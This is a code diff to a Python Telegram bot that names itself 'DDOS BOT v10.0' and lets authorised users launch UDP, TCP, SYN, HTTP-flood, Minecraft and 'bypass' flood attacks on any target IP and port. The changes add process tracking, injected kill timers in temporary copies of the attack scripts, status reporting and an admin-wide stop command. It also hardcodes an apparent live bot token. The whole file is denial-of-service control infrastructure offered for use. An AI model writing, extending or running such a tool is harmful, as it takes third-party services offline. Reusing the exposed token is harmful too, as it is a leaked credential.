@@ -10,6 +10,8 @@ import threading
 import time
 import sys
 import re
+import signal
+import psutil
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
@@ -24,7 +26,7 @@ lock = threading.Lock()
 # ========== BASE DIRECTORY ==========
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# ========== ATTACK SCRIPT MAP (Main Folder) ==========
+# ========== ATTACK SCRIPT MAP ==========
 ATTACK_SCRIPTS = {
     'udp': (os.path.join(BASE_DIR, "udp.py"), 500),
     'tcp': (os.path.join(BASE_DIR, "tcp.py"), 300),
@@ -52,6 +54,23 @@ def save_user(user_id):
     with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
         f.write(f"{user_id}\n")
 
+def kill_process_tree(pid):
+    """Kill a process and all its children"""
+    try:
+        parent = psutil.Process(pid)
+        children = parent.children(recursive=True)
+        for child in children:
+            try:
+                child.kill()
+            except:
+                pass
+        try:
+            parent.kill()
+        except:
+            pass
+    except:
+        pass
+
 def execute_attack(user_id, attack_type, target, port, duration):
     if not 1 <= port <= 65535:
         return False, "Port must be 1-65535"
@@ -63,29 +82,82 @@ def execute_attack(user_id, attack_type, target, port, duration):
 
     script_path, threads = ATTACK_SCRIPTS[attack_type]
 
-    # Debug: print the path
-    print(f"[DEBUG] Looking for: {script_path}")
-    print(f"[DEBUG] File exists: {os.path.exists(script_path)}")
-
     if not os.path.exists(script_path):
         return False, f"Script not found: {script_path}"
 
     try:
-        cmd = ["python3", script_path, target, str(port), str(duration), str(threads)]
+        # Create temp script with duration limit
+        temp_script = f"/tmp/attack_{int(time.time())}_{attack_type}.py"
         
-        def run_attack():
-            try:
-                subprocess.run(cmd, check=True, capture_output=True, text=True)
-            except Exception as e:
-                print(f"[ERROR] Attack failed: {e}")
+        # Read original script
+        with open(script_path, 'r') as f:
+            script_content = f.read()
+        
+        # Add timeout mechanism
+        timeout_code = f'''
+import os
+import signal
+import threading
+import time
 
-        thread = threading.Thread(target=run_attack, daemon=True)
-        thread.start()
+def stop_attack():
+    try:
+        os.kill(os.getpid(), signal.SIGTERM)
+    except:
+        pass
 
+# Stop after {duration} seconds
+timer = threading.Timer({duration}, stop_attack)
+timer.daemon = True
+timer.start()
+
+# Also stop after duration+2 seconds as fallback
+def fallback_stop():
+    time.sleep({duration} + 2)
+    try:
+        os.kill(os.getpid(), signal.SIGKILL)
+    except:
+        pass
+fallback_thread = threading.Thread(target=fallback_stop, daemon=True)
+fallback_thread.start()
+'''
+        
+        # Insert timeout code after imports
+        lines = script_content.split('\n')
+        insert_pos = 0
+        for i, line in enumerate(lines):
+            if line.startswith('import ') or line.startswith('from '):
+                insert_pos = i + 1
+        lines.insert(insert_pos, timeout_code)
+        modified_script = '\n'.join(lines)
+        
+        with open(temp_script, "w") as f:
+            f.write(modified_script)
+        os.chmod(temp_script, 0o755)
+        
+        # Start the attack
+        cmd = ["python3", temp_script, target, str(port), str(duration), str(threads)]
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+        )
+        
+        # Store process info
         with lock:
             if user_id not in running_attacks:
                 running_attacks[user_id] = []
-            running_attacks[user_id].append((thread, attack_type, target, port, duration, threads))
+            running_attacks[user_id].append({
+                'process': process,
+                'pid': process.pid,
+                'temp_script': temp_script,
+                'attack_type': attack_type,
+                'target': target,
+                'port': port,
+                'duration': duration,
+                'threads': threads,
+                'start_time': time.time()
+            })
 
         return True, f"✅ {attack_type.upper()} attack started on {target}:{port} for {duration}s with {threads} threads"
 
@@ -96,9 +168,29 @@ def stop_user_attacks(user_id):
     with lock:
         if user_id not in running_attacks:
             return 0
-        count = len(running_attacks[user_id])
+        
+        count = 0
+        for attack in running_attacks[user_id]:
+            try:
+                pid = attack.get('pid')
+                if pid:
+                    kill_process_tree(pid)
+                temp_script = attack.get('temp_script')
+                if temp_script and os.path.exists(temp_script):
+                    os.remove(temp_script)
+                count += 1
+            except:
+                pass
+        
         running_attacks[user_id] = []
         return count
+
+def stop_all_attacks():
+    total = 0
+    with lock:
+        for user_id in list(running_attacks.keys()):
+            total += stop_user_attacks(user_id)
+    return total
 
 # ========== TELEGRAM COMMANDS ==========
 
@@ -125,7 +217,8 @@ def start_command(message):
 /id - Get your ID
 /check - Check attack status
 
-Example: /udp 8.8.8.8 53 10""")
+Example: /udp 8.8.8.8 53 10
+Duration: 1-600 seconds""")
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
@@ -160,11 +253,22 @@ def status_command(message):
         if user_id not in running_attacks or not running_attacks[user_id]:
             bot.reply_to(message, "📭 No active attacks")
             return
-        attacks = running_attacks[user_id]
-        msg = f"🔥 ACTIVE ATTACKS ({len(attacks)})\n\n"
-        for i, (thread, attack_type, target, port, duration, threads) in enumerate(attacks, 1):
-            msg += f"{i}. {attack_type.upper()} → {target}:{port}\n"
-            msg += f"   ⏱️ Duration: {duration}s | 🧵 Threads: {threads}\n"
+        
+        msg = f"🔥 ACTIVE ATTACKS\n\n"
+        for i, attack in enumerate(running_attacks[user_id], 1):
+            try:
+                is_running = psutil.pid_exists(attack['pid'])
+            except:
+                is_running = False
+            
+            status = "🟢 Running" if is_running else "🔴 Stopped"
+            elapsed = int(time.time() - attack['start_time'])
+            remaining = max(0, attack['duration'] - elapsed)
+            
+            msg += f"{i}. {attack['attack_type'].upper()} → {attack['target']}:{attack['port']}\n"
+            msg += f"   ⏱️ Duration: {attack['duration']}s | Remaining: {remaining}s\n"
+            msg += f"   📊 Status: {status}\n\n"
+        
         bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['stopall'])
@@ -173,6 +277,14 @@ def stopall_command(message):
     count = stop_user_attacks(user_id)
     bot.reply_to(message, f"✅ Stopped {count} attack(s)")
 
+@bot.message_handler(commands=['globalstop'])
+def globalstop_command(message):
+    if str(message.chat.id) not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Admin only")
+        return
+    count = stop_all_attacks()
+    bot.reply_to(message, f"✅ Stopped {count} global attacks")
+
 @bot.message_handler(commands=['check'])
 def check_command(message):
     user_id = str(message.chat.id)
@@ -180,13 +292,19 @@ def check_command(message):
         bot.reply_to(message, "❌ Not authorized")
         return
     
-    result = subprocess.getoutput(f"ps aux | grep -E 'python3.*(udp|tcp|syn|httpflood|tudp|mc|mcquery|mchandshake|udpbypass|tcpbypass|gudp)\\.py' | grep -v grep")
+    # Check for any running attack processes
+    result = subprocess.getoutput("ps aux | grep -E 'attack_.*\\.py' | grep -v grep | grep -v bot.py")
     if result:
-        response = f"🟢 ATTACK RUNNING!\n\n{result[:300]}"
+        response = f"🟢 ATTACK RUNNING!\n\n```\n{result[:400]}\n```"
     else:
         response = "🔴 No attack running"
     
-    bot.reply_to(message, response)
+    # Also check temp files
+    files = subprocess.getoutput("ls -la /tmp/attack_*.py 2>/dev/null")
+    if files and "No such file" not in files:
+        response += f"\n\n📁 Temp files:\n```\n{files[:200]}\n```"
+    
+    bot.reply_to(message, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['admin'])
 def admin_command(message):
@@ -196,7 +314,8 @@ def admin_command(message):
     bot.reply_to(message, """👑 ADMIN:
 /add <userid> - Add user
 /remove <userid> - Remove user
-/allusers - List users""")
+/allusers - List users
+/globalstop - Stop ALL attacks""")
 
 @bot.message_handler(commands=['add'])
 def add_command(message):
@@ -272,11 +391,15 @@ def make_handler(attack_type):
             bot.reply_to(message, "❌ Port and time must be numbers")
             return
 
+        if duration < 1 or duration > 600:
+            bot.reply_to(message, "❌ Duration must be 1-600 seconds")
+            return
+
         status_msg = bot.reply_to(message, f"⚡ Starting {attack_type.upper()} attack...")
         success, msg = execute_attack(user_id, attack_type, target, port, duration)
         
         if success:
-            bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
+            bot.edit_message_text(f"✅ {msg}\n\n⏱️ Attack will stop after {duration}s", chat_id=message.chat.id, message_id=status_msg.message_id)
         else:
             bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
 
@@ -297,6 +420,14 @@ if __name__ == "__main__":
     print("💀 DDOS BOT v10.0 - SCRIPT BASED 💀")
     print("=" * 50)
     
+    # Install psutil if not installed
+    try:
+        import psutil
+    except:
+        print("[!] Installing psutil...")
+        os.system("pip3 install psutil")
+        import psutil
+    
     allowed_users = load_users()
     for admin in ADMIN_IDS:
         if admin not in allowed_users:
@@ -306,7 +437,6 @@ if __name__ == "__main__":
     print(f"[+] Loaded {len(allowed_users)} users")
     print(f"[+] Admin IDs: {ADMIN_IDS}")
     print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
-    print(f"[+] Scripts directory: {BASE_DIR}")
     print("=" * 50)
     print("[+] Bot running! Press Ctrl+C to stop.")
     bot.polling(none_stop=True)
